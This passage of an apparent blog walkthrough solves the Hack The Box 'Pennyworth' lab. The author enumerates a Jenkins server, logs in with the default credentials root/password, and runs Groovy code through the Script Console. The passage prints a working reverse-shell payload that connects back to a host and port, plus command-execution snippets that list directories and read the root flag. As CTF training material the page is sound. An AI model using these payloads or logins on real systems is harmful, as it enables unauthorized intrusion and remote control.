</span></span><span class=line><span class=cl>http://10.129.167.232:8080/ <span class=o>[</span><span class=m>403</span> Forbidden<span class=o>]</span> Cookies<span class=o>[</span>JSESSIONID.44a92248<span class=o>]</span>, Country<span class=o>[</span>RESERVED<span class=o>][</span>ZZ<span class=o>]</span>, HTTPServer<span class=o>[</span>Jetty<span class=o>(</span>9.4.39.v20210325<span class=o>)]</span>, HttpOnly<span class=o>[</span>JSESSIONID.44a92248<span class=o>]</span>, IP<span class=o>[</span>10.129.167.232<span class=o>]</span>, Jenkins<span class=o>[</span>2.289.1<span class=o>]</span>, Jetty<span class=o>[</span>9.4.39.v20210325<span class=o>]</span>, Meta-Refresh-Redirect<span class=o>[</span>/login?from<span class=o>=</span>%2F<span class=o>]</span>, Script, UncommonHeaders<span class=o>[</span>x-content-type-options,x-hudson,x-jenkins,x-jenkins-session<span class=o>]</span>
</span></span><span class=line><span class=cl>http://10.129.167.232:8080/login?from<span class=o>=</span>%2F <span class=o>[</span><span class=m>200</span> OK<span class=o>]</span> Cookies<span class=o>[</span>JSESSIONID.44a92248<span class=o>]</span>, Country<span class=o>[</span>RESERVED<span class=o>][</span>ZZ<span class=o>]</span>, HTML5, HTTPServer<span class=o>[</span>Jetty<span class=o>(</span>9.4.39.v20210325<span class=o>)]</span>, HttpOnly<span class=o>[</span>JSESSIONID.44a92248<span class=o>]</span>, IP<span class=o>[</span>10.129.167.232<span class=o>]</span>, Jenkins<span class=o>[</span>2.289.1<span class=o>]</span>, Jetty<span class=o>[</span>9.4.39.v20210325<span class=o>]</span>, PasswordField<span class=o>[</span>j_password<span class=o>]</span>, Script<span class=o>[</span>text/javascript<span class=o>]</span>, Title<span class=o>[</span>Sign in <span class=o>[</span>Jenkins<span class=o>]]</span>, UncommonHeaders<span class=o>[</span>x-content-type-options,x-hudson,x-jenkins,x-jenkins-session,x-instance-identity<span class=o>]</span>, X-Frame-Options<span class=o>[</span>sameorigin<span class=o>]</span>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-luovj0ahiq<span class=o>]</span>─<span class=o>[</span>~/pennyworth<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ $
</span></span></code></pre></div><p>Interestingly, once we try to access the <strong>webpage</strong> in our browser, we are redirected to a <strong>Jenkins</strong> login page.</p><p><img loading=lazy src=/walkthroughs/htb/starting-point/tier_1/pennyworth/jetkins-login.png alt=jenkins-login title=jenkins-login></p><blockquote><p>2.289.1</p></blockquote><h2 id=task-5><strong>TASK 5</strong><a hidden class=anchor aria-hidden=true href=#task-5>#</a></h2><p><strong>Question</strong>: <em>What type of script is accepted as input on the Jenkins Script Console?</em></p><p>Not quite done with <strong>recon</strong>, so we <strong>continue</strong>. But, since</p><ul><li>the <strong>landing page</strong> is <strong>restricted</strong>,</li><li>accessing the landing page triggers redirection to the login page,</li></ul><p>our <strong>dir busting</strong> with <em><strong>gobuster</strong></em> will fail in it&rsquo; default configuration.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-luovj0ahiq<span class=o>]</span>─<span class=o>[</span>~/pennyworth<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=nv>$gobuster</span> dir -u http://<span class=nv>$rhost</span>:8080/ -w /usr/share/wordlists/dirb/common.txt
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>Gobuster v3.1.0
</span></span><span class=line><span class=cl>by OJ Reeves <span class=o>(</span>@TheColonial<span class=o>)</span> <span class=p>&amp;</span> Christian Mehlmauer <span class=o>(</span>@firefart<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Url:                     http://10.129.167.232:8080/
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Method:                  GET
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Threads:                 <span class=m>10</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Wordlist:                /usr/share/wordlists/dirb/common.txt
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Negative Status codes:   <span class=m>404</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> User Agent:              gobuster/3.1.0
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Timeout:                 <span class=nv>10s</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>2023/05/10 11:38:05 Starting gobuster in directory enumeration <span class=nv>mode</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>Error: the server returns a status code that matches the provided options <span class=k>for</span> non existing urls. http://10.129.167.232:8080/b001707e-91a0-419c-a1d1-e48f1ebbffcc <span class=o>=</span>&gt; <span class=m>403</span> <span class=o>(</span>Length: 613<span class=o>)</span>. To <span class=k>continue</span> please exclude the status code, the length or use the --wildcard switch
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>✗<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-luovj0ahiq<span class=o>]</span>─<span class=o>[</span>~/pennyworth<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ $
</span></span></code></pre></div><p>Nevertheless, <em><strong>gobuster</strong></em> is nice enough to give us some ideas to try out. One of them is simply <strong>excluding</strong> the <em>403 Forbidden</em> response status code from the results.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>✗<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-luovj0ahiq<span class=o>]</span>─<span class=o>[</span>~/pennyworth<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=nv>$gobuster</span> dir -u http://<span class=nv>$rhost</span>:8080/ -w /usr/share/wordlists/dirb/common.txt -b <span class=nv>403</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>Gobuster v3.1.0
</span></span><span class=line><span class=cl>by OJ Reeves <span class=o>(</span>@TheColonial<span class=o>)</span> <span class=p>&amp;</span> Christian Mehlmauer <span class=o>(</span>@firefart<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Url:                     http://10.129.167.232:8080/
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Method:                  GET
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Threads:                 <span class=m>10</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Wordlist:                /usr/share/wordlists/dirb/common.txt
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Negative Status codes:   <span class=m>403</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> User Agent:              gobuster/3.1.0
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Timeout:                 <span class=nv>10s</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>2023/05/10 11:38:08 Starting gobuster in directory enumeration <span class=nv>mode</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>/assets               <span class=o>(</span>Status: 302<span class=o>)</span> <span class=o>[</span>Size: 0<span class=o>]</span> <span class=o>[</span>--&gt; http://10.129.167.232:8080/assets/<span class=o>]</span>
</span></span><span class=line><span class=cl>/error                <span class=o>(</span>Status: 400<span class=o>)</span> <span class=o>[</span>Size: 6241<span class=o>]</span>                                      
</span></span><span class=line><span class=cl>/favicon.ico          <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 17542<span class=o>]</span>                                     
</span></span><span class=line><span class=cl>/git                  <span class=o>(</span>Status: 302<span class=o>)</span> <span class=o>[</span>Size: 0<span class=o>]</span> <span class=o>[</span>--&gt; http://10.129.167.232:8080/git/<span class=o>]</span>   
</span></span><span class=line><span class=cl>/login                <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 2028<span class=o>]</span>                                      
</span></span><span class=line><span class=cl>/logout               <span class=o>(</span>Status: 302<span class=o>)</span> <span class=o>[</span>Size: 0<span class=o>]</span> <span class=o>[</span>--&gt; http://10.129.167.232:8080/<span class=o>]</span>       
</span></span><span class=line><span class=cl>/meta-inf             <span class=o>(</span>Status: 404<span class=o>)</span> <span class=o>[</span>Size: 452<span class=o>]</span>                                       
</span></span><span class=line><span class=cl>/META-INF             <span class=o>(</span>Status: 404<span class=o>)</span> <span class=o>[</span>Size: 452<span class=o>]</span>                                       
</span></span><span class=line><span class=cl>/robots.txt           <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 71<span class=o>]</span>                                        
</span></span><span class=line><span class=cl>/signup               <span class=o>(</span>Status: 404<span class=o>)</span> <span class=o>[</span>Size: 6205<span class=o>]</span>                                      
</span></span><span class=line><span class=cl>/WEB-INF              <span class=o>(</span>Status: 404<span class=o>)</span> <span class=o>[</span>Size: 451<span class=o>]</span>                                       
</span></span><span class=line><span class=cl>/web-inf              <span class=o>(</span>Status: 404<span class=o>)</span> <span class=o>[</span>Size: 451<span class=o>]</span>                                       
</span></span><span class=line><span class=cl>                                                                                      
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>2023/05/10 11:38:14 <span class=nv>Finished</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-luovj0ahiq<span class=o>]</span>─<span class=o>[</span>~/pennyworth<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ $
</span></span></code></pre></div><p>Checking out the pages that we found does reveal some interesting information. One of them is the content of the <em>robots.txt</em>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-luovj0ahiq<span class=o>]</span>─<span class=o>[</span>~/pennyworth<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=nv>$curl</span> http://<span class=nv>$rhost</span>:8080/robots.txt
</span></span><span class=line><span class=cl><span class=c1># we don&#39;t want robots to click &#34;build&#34; links</span>
</span></span><span class=line><span class=cl>User-agent: *
</span></span><span class=line><span class=cl>Disallow: /
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-luovj0ahiq<span class=o>]</span>─<span class=o>[</span>~/pennyworth<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ $
</span></span></code></pre></div><p>An other one is the <strong>search bar</strong> that we can access by opening either the - <em>http://$rhost:8080/error</em> - or the - <em>http://$rhost:8080/signup</em> - page.</p><p>Additionally, one other thing maybe worth looking into is the modified <em><strong>url</strong></em>.</p><p>Searching for - <em>test</em> - via the <strong>search bar</strong> on the <em>/signup</em> page redirects us to the <em>login page</em> but with some interesting <strong>url</strong> parameter values:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=err>http://10.129.167.232:8080/login?from=%2Fsearch%2F%3Fq%3Dtest%26Jenkins-Crumb%3D52fd38b432dda0661460c3d9e6e473ee555c5c688bd0fd48d113d183eb28a7ed
</span></span></span></code></pre></div><p>Once we <strong>url</strong> decode it (online decoder or using the decoder in burp) it becomes:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=err>http://10.129.167.232:8080/login?from=/search/?q=test&amp;Jenkins-Crumb=52fd38b432dda0661460c3d9e6e473ee555c5c688bd0fd48d113d183eb28a7ed
</span></span></span></code></pre></div><p>Doing a quick <strong>online search</strong> on <em>Jenkins-Crumb</em> reveals that it might be used as a <strong>protection against CSRF</strong> (cross-site-request-forgery) attacks. Here is the info we found on the computed <strong>hash</strong> part:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>The Default Crumb Issuer encodes the following information in the hash used as crumb:
</span></span><span class=line><span class=cl>- The user name that the crumb was generated for
</span></span><span class=line><span class=cl>- The web session ID that the crumb was generated in
</span></span><span class=line><span class=cl>- The IP address of the user that the crumb was generated for
</span></span><span class=line><span class=cl>- A salt unique to this Jenkins instance
</span></span></code></pre></div><p>We take a note of if and we continue with our <strong>recon</strong>.</p><p>Since we already found a <strong>login page</strong>, let us try some <strong>default credentials</strong>. We get lucky fairly quickly: it is still left with the</p><table><thead><tr><th>default credentials</th><th></th></tr></thead><tbody><tr><td><em>username</em></td><td style=text-align:left>root</td></tr><tr><td><em>password</em></td><td style=text-align:left>password</td></tr></tbody></table><p>configured. Once we log in, we are welcomed with a <strong>Dashboard</strong> and a couple of other <strong>control</strong> options.</p><p><img loading=lazy src=/walkthroughs/htb/starting-point/tier_1/pennyworth/jetkins-post-log-in.png alt=jenkins-post-log-in title=jenkins-post-log-in></p><p>But since this is our first <strong>login</strong>, we must take a proper <strong>look around</strong>. One possibly (very) important <strong>discovery</strong> we make is the <em><strong>Script Console</strong></em>. It is accessible via <em><strong>Manage Jenkins (#1) -> Script Console (#2)</strong></em> or directly accessing - <em>http://$rhost:8080/script</em> - once already authenticated.</p><p><img loading=lazy src=/walkthroughs/htb/starting-point/tier_1/pennyworth/jetkins-script-console-1.png alt=jenkins-script-console-1 title=jenkins-script-console-1></p><p><img loading=lazy src=/walkthroughs/htb/starting-point/tier_1/pennyworth/jetkins-script-console-2.png alt=jenkins-script-console-2 title=jenkins-script-console-2></p><p><img loading=lazy src=/walkthroughs/htb/starting-point/tier_1/pennyworth/jetkins-script-console-3.png alt=jenkins-script-console-3 title=jenkins-script-console-3></p><p>One thing we take a <strong>note</strong> of is the <em><strong>Script Console's</strong></em> description.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>Type in an arbitrary Groovy script and execute it on the server.
</span></span><span class=line><span class=cl>...
</span></span></code></pre></div><p>It not only directly solves the current TASK for us, but it also provides us with a <strong>hint</strong> that can help us with planning our next course of actions.</p><p>We <strong>run</strong> the given <strong>example command</strong> to verify if the console really works.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=cm>/* example command */</span>
</span></span><span class=line><span class=cl><span class=nx>println</span><span class=p>(</span><span class=nx>Jenkins</span><span class=p>.</span><span class=nx>instance</span><span class=p>.</span><span class=nx>pluginManager</span><span class=p>.</span><span class=nx>plugins</span><span class=p>)</span>
</span></span></code></pre></div><p>And in fact it does, it even <strong>displays</strong> the <strong>output</strong> for us. How nice&mldr; but also, how dangerous.</p><p><img loading=lazy src=/walkthroughs/htb/starting-point/tier_1/pennyworth/groovy-test-run.png alt=groovy-test-run title=groovy-test-run></p><blockquote><p>groovy</p></blockquote><h2 id=task-6><strong>TASK 6</strong><a hidden class=anchor aria-hidden=true href=#task-6>#</a></h2><p><strong>Question</strong>: <em>What would the "String cmd" variable from the Groovy Script snippet be equal to if the Target VM was running Windows?</em></p><p>The way the <strong>command execution</strong> that we found in TASK5 actually works is quite simple:</p><ul><li>we feed the <strong>Script Console</strong> a <strong>groovy</strong> script (in this case our crafted payload)</li><li>the <em>script</em> get&rsquo;s executed on the <strong>target</strong> system</li><li>output is displayed under <strong>Result</strong></li></ul><p>Since we already found the <strong>vulnerability</strong>, we already inspected it, tested it, it is now finally time to <strong>exploit</strong> it. One of the first <strong>exploits</strong> that we find <strong>online</strong> is this one:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=n>String</span> <span class=n>host</span><span class=o>=</span><span class=s>&#34;localhost&#34;</span><span class=o>;</span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=n>port</span><span class=o>=</span><span class=mi>8044</span><span class=o>;</span>
</span></span><span class=line><span class=cl><span class=n>String</span> <span class=n>cmd</span><span class=o>=</span><span class=s>&#34;cmd.exe&#34;</span><span class=o>;</span>
</span></span><span class=line><span class=cl><span class=n>Process</span> <span class=n>p</span><span class=o>=</span><span class=k>new</span> <span class=n>ProcessBuilder</span><span class=o>(</span><span class=n>cmd</span><span class=o>).</span><span class=na>redirectErrorStream</span><span class=o>(</span><span class=kc>true</span><span class=o>).</span><span class=na>start</span><span class=o>();</span><span class=n>Socket</span> <span class=n>s</span><span class=o>=</span><span class=k>new</span> <span class=n>Socket</span><span class=o>(</span><span class=n>host</span><span class=o>,</span><span class=n>port</span><span class=o>);</span><span class=n>InputStream</span> <span class=n>pi</span><span class=o>=</span><span class=n>p</span><span class=o>.</span><span class=na>getInputStream</span><span class=o>(),</span><span class=n>pe</span><span class=o>=</span><span class=n>p</span><span class=o>.</span><span class=na>getErrorStream</span><span class=o>(),</span> <span class=n>si</span><span class=o>=</span><span class=n>s</span><span class=o>.</span><span class=na>getInputStream</span><span class=o>();</span><span class=n>OutputStream</span> <span class=n>po</span><span class=o>=</span><span class=n>p</span><span class=o>.</span><span class=na>getOutputStream</span><span class=o>(),</span><span class=n>so</span><span class=o>=</span><span class=n>s</span><span class=o>.</span><span class=na>getOutputStream</span><span class=o>();</span><span class=k>while</span><span class=o>(!</span><span class=n>s</span><span class=o>.</span><span class=na>isClosed</span><span class=o>()){</span><span class=k>while</span><span class=o>(</span><span class=n>pi</span><span class=o>.</span><span class=na>available</span><span class=o>()&gt;</span><span class=mi>0</span><span class=o>)</span><span class=n>so</span><span class=o>.</span><span class=na>write</span><span class=o>(</span><span class=n>pi</span><span class=o>.</span><span class=na>read</span><span class=o>());</span><span class=k>while</span><span class=o>(</span><span class=n>pe</span><span class=o>.</span><span class=na>available</span><span class=o>()&gt;</span><span class=mi>0</span><span class=o>)</span><span class=n>so</span><span class=o>.</span><span class=na>write</span><span class=o>(</span><span class=n>pe</span><span class=o>.</span><span class=na>read</span><span class=o>());</span><span class=k>while</span><span class=o>(</span><span class=n>si</span><span class=o>.</span><span class=na>available</span><span class=o>()&gt;</span><span class=mi>0</span><span class=o>)</span><span class=n>po</span><span class=o>.</span><span class=na>write</span><span class=o>(</span><span class=n>si</span><span class=o>.</span><span class=na>read</span><span class=o>());</span><span class=n>so</span><span class=o>.</span><span class=na>flush</span><span class=o>();</span><span class=n>po</span><span class=o>.</span><span class=na>flush</span><span class=o>();</span><span class=n>Thread</span><span class=o>.</span><span class=na>sleep</span><span class=o>(</span><span class=mi>50</span><span class=o>);</span><span class=k>try</span> <span class=o>{</span><span class=n>p</span><span class=o>.</span><span class=na>exitValue</span><span class=o>();</span><span class=k>break</span><span class=o>;}</span><span class=k>catch</span> <span class=o>(</span><span class=n>Exception</span> <span class=n>e</span><span class=o>){}};</span><span class=n>p</span><span class=o>.</span><span class=na>destroy</span><span class=o>();</span><span class=n>s</span><span class=o>.</span><span class=na>close</span><span class=o>();</span>
</span></span></code></pre></div><p>This would in theory - once run on our target - spawn a <strong>reverse shell</strong> and connect back to us (our local machine). It&rsquo;s nice and it does in fact answer our TASK, but how about something simpler, something else&mldr;</p><p>This is one of the other <strong>exploits</strong> we found:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=n>def</span> <span class=n>sout</span> <span class=o>=</span> <span class=k>new</span> <span class=n>StringBuilder</span><span class=o>(),</span> <span class=n>serr</span> <span class=o>=</span> <span class=k>new</span> <span class=n>StringBuilder</span><span class=o>()</span>
</span></span><span class=line><span class=cl><span class=n>def</span> <span class=n>proc</span> <span class=o>=</span> <span class=err>&#39;</span><span class=n>ls</span><span class=err>&#39;</span><span class=o>.</span><span class=na>execute</span><span class=o>()</span>
</span></span><span class=line><span class=cl><span class=n>proc</span><span class=o>.</span><span class=na>consumeProcessOutput</span><span class=o>(</span><span class=n>sout</span><span class=o>,</span> <span class=n>serr</span><span class=o>)</span>
</span></span><span class=line><span class=cl><span class=n>proc</span><span class=o>.</span><span class=na>waitForOrKill</span><span class=o>(</span><span class=mi>1000</span><span class=o>)</span>
</span></span><span class=line><span class=cl><span class=n>println</span> <span class=s>&#34;out&gt; $sout err&gt; $serr&#34;</span>
</span></span></code></pre></div><p>In principle, it would simply <strong>execute</strong> the <strong>command</strong> that is placed between the two apostrophes - <em>'&lt;our-command>'.execute()</em> - on our target, and <strong>display</strong> the <strong>results</strong> on the webpage. Once run, this is the result we get back:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>out&gt; bin
</span></span><span class=line><span class=cl>boot
</span></span><span class=line><span class=cl>cdrom
</span></span><span class=line><span class=cl>dev
</span></span><span class=line><span class=cl>etc
</span></span><span class=line><span class=cl>home
</span></span><span class=line><span class=cl>lib
</span></span><span class=line><span class=cl>lib32
</span></span><span class=line><span class=cl>lib64
</span></span><span class=line><span class=cl>libx32
</span></span><span class=line><span class=cl>lost+found
</span></span><span class=line><span class=cl>media
</span></span><span class=line><span class=cl>mnt
</span></span><span class=line><span class=cl>opt
</span></span><span class=line><span class=cl>proc
</span></span><span class=line><span class=cl>root
</span></span><span class=line><span class=cl>run
</span></span><span class=line><span class=cl>sbin
</span></span><span class=line><span class=cl>snap
</span></span><span class=line><span class=cl>srv
</span></span><span class=line><span class=cl>sys
</span></span><span class=line><span class=cl>tmp
</span></span><span class=line><span class=cl>usr
</span></span><span class=line><span class=cl>var
</span></span><span class=line><span class=cl> err&gt; 
</span></span></code></pre></div><p>It look&rsquo;s like we are located in our <strong>target</strong> system&rsquo;s root (/) directory. Looking around a bit, like with</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=o>...</span>
</span></span><span class=line><span class=cl><span class=n>def</span> <span class=n>proc</span> <span class=o>=</span> <span class=err>&#39;</span><span class=n>ls</span> <span class=o>/</span><span class=n>root</span><span class=o>/</span><span class=err>&#39;</span><span class=o>.</span><span class=na>execute</span><span class=o>()</span>
</span></span><span class=line><span class=cl><span class=o>...</span>
</span></span></code></pre></div><p>reveals our flag&rsquo;s location at - <em>/root/flag.txt</em> -.</p><blockquote><p>cmd.exe</p></blockquote><h2 id=task-7><strong>TASK 7</strong><a hidden class=anchor aria-hidden=true href=#task-7>#</a></h2><p><strong>Question</strong>: <em>What is a different command than "ip a" we could use to display our network interfaces&rsquo; information on Linux?</em></p><p>Using the <strong>internet</strong> never get&rsquo;s old.</p><blockquote><p>ifconfig</p></blockquote><h2 id=task-8><strong>TASK 8</strong><a hidden class=anchor aria-hidden=true href=#task-8>#</a></h2><p><strong>Question</strong>: <em>What switch should we use with netcat for it to use UDP transport mode?</em></p><p>And neither does using a command&rsquo;s built-in <strong>help option</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.46<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-luovj0ahiq<span class=o>]</span>─<span class=o>[</span>~/pennyworth<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ nc --help
</span></span><span class=line><span class=cl>Ncat 7.93 <span class=o>(</span> https://nmap.org/ncat <span class=o>)</span>
</span></span><span class=line><span class=cl>Usage: ncat <span class=o>[</span>options<span class=o>]</span> <span class=o>[</span>hostname<span class=o>]</span> <span class=o>[</span>port<span class=o>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Options taking a <span class=nb>time</span> assume seconds. Append <span class=s1>&#39;ms&#39;</span> <span class=k>for</span> milliseconds,
</span></span><span class=line><span class=cl><span class=s1>&#39;s&#39;</span> <span class=k>for</span> seconds, <span class=s1>&#39;m&#39;</span> <span class=k>for</span> minutes, or <span class=s1>&#39;h&#39;</span> <span class=k>for</span> hours <span class=o>(</span>e.g. 500ms<span class=o>)</span>.
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>  -u, --udp                  Use UDP instead of default TCP
</span></span><span class=line><span class=cl>...
</span></span></code></pre></div><blockquote><p>-u</p></blockquote><h2 id=task-9><strong>TASK 9</strong><a hidden class=anchor aria-hidden=true href=#task-9>#</a></h2><p><strong>Question</strong>: <em>What is the term used to describe making a target host initiate a connection back to the attacker host?</em></p><p>One of the <strong>exploits</strong> we found in TASK6 does exactly this.</p><blockquote><p>reverse shell</p></blockquote><h2 id=submit-flag><strong>SUBMIT FLAG</strong><a hidden class=anchor aria-hidden=true href=#submit-flag>#</a></h2><p><strong>Question</strong>: <em>Submit root flag</em></p><p>Since we already located the <strong>flag</strong> in TASK6, all that&rsquo;s left to do is to <strong>modify</strong> our <strong>exploit</strong> so that it directly <strong>displays</strong> the <strong>flag</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=n>def</span> <span class=n>sout</span> <span class=o>=</span> <span class=k>new</span> <span class=n>StringBuilder</span><span class=o>(),</span> <span class=n>serr</span> <span class=o>=</span> <span class=k>new</span> <span class=n>StringBuilder</span><span class=o>()</span>
</span></span><span class=line><span class=cl><span class=n>def</span> <span class=n>proc</span> <span class=o>=</span> <span class=err>&#39;</span><span class=n>cat</span> <span class=o>/</span><span class=n>root</span><span class=o>/</span><span class=n>flag</span><span class=o>.</span><span class=na>txt</span><span class=err>&#39;</span><span class=o>.</span><span class=na>execute</span><span class=o>()</span>
</span></span><span class=line><span class=cl><span class=n>proc</span><span class=o>.</span><span class=na>consumeProcessOutput</span><span class=o>(</span><span class=n>sout</span><span class=o>,</span> <span class=n>serr</span><span class=o>)</span>
</span></span><span class=line><span class=cl><span class=n>proc</span><span class=o>.</span><span class=na>waitForOrKill</span><span class=o>(</span><span class=mi>1000</span><span class=o>)</span>
</span></span><span class=line><span class=cl><span class=n>println</span> <span class=s>&#34;out&gt; $sout err&gt; $serr&#34;</span>
</span></span></code></pre></div><p>Once run, the <strong>flag</strong> is visible under <strong>Result</strong>.</p><p><img loading=lazy src=/walkthroughs/htb/starting-point/tier_1/pennyworth/flag.png alt=flag title=flag></p><blockquote><p>flag</p></blockquote><p><strong>Congratulations</strong>, we just successfully <strong>pwned</strong> the <strong>target machine</strong>. All we have left to do now is to <strong>terminate</strong> the <strong>target</strong> box (if not terminated automatically) <strong>before</strong> we <strong>continue</strong> with the next box!</p></div><footer class=post-footer><ul class=post-tags><li><a href=https://bluewalle.github.io/tags/htb/>htb</a></li><li><a href=https://bluewalle.github.io/tags/walkthrough/>walkthrough</a></li><li><a href=https://bluewalle.github.io/tags/pennyworth/>pennyworth</a></li><li><a href=https://bluewalle.github.io/tags/tier-1/>tier-1</a></li><li><a href=https://bluewalle.github.io/tags/vip-tier/>vip-tier</a></li><li><a href=https://bluewalle.github.io/tags/web/>web</a></li><li><a href=https://bluewalle.github.io/tags/common-applications/>common-applications</a></li><li><a href=https://bluewalle.github.io/tags/jenkins/>jenkins</a></li><li><a href=https://bluewalle.github.io/tags/java/>java</a></li><li><a href=https://bluewalle.github.io/tags/reconnaissance/>reconnaissance</a></li><li><a href=https://bluewalle.github.io/tags/remote-code-execution/>remote-code-execution</a></li><li><a href=https://bluewalle.github.io/tags/default-credentials/>default-credentials</a></li></ul></footer></article></main><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>